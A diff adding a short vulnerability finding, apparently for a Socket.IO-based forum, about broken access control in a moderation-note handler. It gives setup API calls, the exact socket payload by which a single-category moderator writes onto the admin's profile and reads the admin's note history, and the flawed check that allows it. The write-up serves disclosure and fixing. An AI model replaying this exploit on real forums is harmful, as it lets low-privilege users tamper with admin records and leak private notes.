@@ -1,0 +1,13 @@
+### VULN-014 — Socket user.setModerationNote broken access control (Socket.IO)
+
+### Setup (admin): create a low-priv user and grant them 'moderate' on ONE category:
+POST /api/v3/users                              {"username":"catmod_<rand>","password":"..."}
+PUT  /api/v3/categories/2/privileges/moderate   {"member":<mod_uid>}
+
+### Exploit (as the single-category moderator; NOT admin, NOT global-mod), over Socket.IO:
+emit "user.setModerationNote"  {"uid": 1, "note": "PLANTED_BY_catmod_<rand>"}
+#   uid:1 = the ADMIN. canEdit(mod, 1, false) is FALSE (target is admin -> !isTargetAdmin protects it),
+#   but the fallback user.isModeratorOfAnyCategory(mod)=true lets it through.
+#
+#   ack -> [ null , [ { "note":"...PLANTED_BY_catmod_<rand>...", "uid":<mod_uid>, ... } ] ]
+#   i.e. the note is written onto the ADMIN's profile AND the admin's full note history is returned.
